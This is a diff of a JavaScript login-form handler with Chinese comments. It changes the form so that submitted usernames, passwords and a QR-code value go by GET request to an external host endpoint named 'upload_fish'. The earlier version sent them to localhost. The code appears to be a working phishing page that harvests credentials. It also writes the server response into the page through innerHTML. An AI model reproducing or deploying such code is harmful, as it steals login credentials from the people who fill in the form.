@@ -1,54 +1,15 @@
-var isClicked = false;
+var xhr = new XMLHttpRequest();
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault(); // 阻止表单默认提交行为
+	var name = document.getElementById("user").value; 
+	var password = document.getElementById("password").value;
+	var qrcode = document.getElementById("qrcode").value;
+	var url = "https://yxvm.gzx7301.top:23056/upload_fish?user=" + encodeURIComponent(name) + "&password=" + encodeURIComponent(password) + "&qr=" + encodeURIComponent(qrcode);
 
-    // 获取用户名和密码
-    const username = document.getElementById("user").value; 
-	const password = document.getElementById("password").value;
-	const qrcode = document.getElementById("qrcode").value;
-    if (username == null || username == "" || password == null || password == "" || qrcode == null || qrcode == "") {
-        alert("请检查是否所有输入框都输入了内容");
-        return false;
-    }
-    // 发送POST请求
-    if (!isClicked) {
-        isClicked = true;
-        const url ='http://localhost:23056/upload_fish'
-        const queryParams = {
-            user: encodeURIComponent(username),
-            password: encodeURIComponent(password),
-            qr: encodeURIComponent(qrcode)
-          };
-        const params = new URLSearchParams(queryParams);
-        const queryString = params.toString();
-        //fetch('https://yxvm.gzx7301.top:23056/upload_fish', {
-        fetch(`${url}?${queryString}`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            //body: `user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&qr=${encodeURIComponent(qrcode)}`
-
-            body:''
-        })
-        .then(response => {
-            if (response.ok) {
-                return response.json();
-            } else {
-                document.getElementById('result').innerText = 'Http Error ' + response.status;
-            }
-        })
-        .then(data => {
-            // 动态显示POST请求的结果在result标签
-            document.getElementById('result').innerHTML = `${data}`
-        })
-        .catch(error => {
-            console.error('请求失败：', error);
-        });
-        
-    
-        setTimeout(function() {
-            isClicked = false;
-        }, 500);  // 500毫秒后，允许再次点击
-    }
+    xhr.onreadystatechange = function() {
+        document.getElementById('result').innerHTML = xhr.responseText;
+    };
+    xhr.open("GET", url, true);
+    // 发送请求
+    xhr.send();
 });
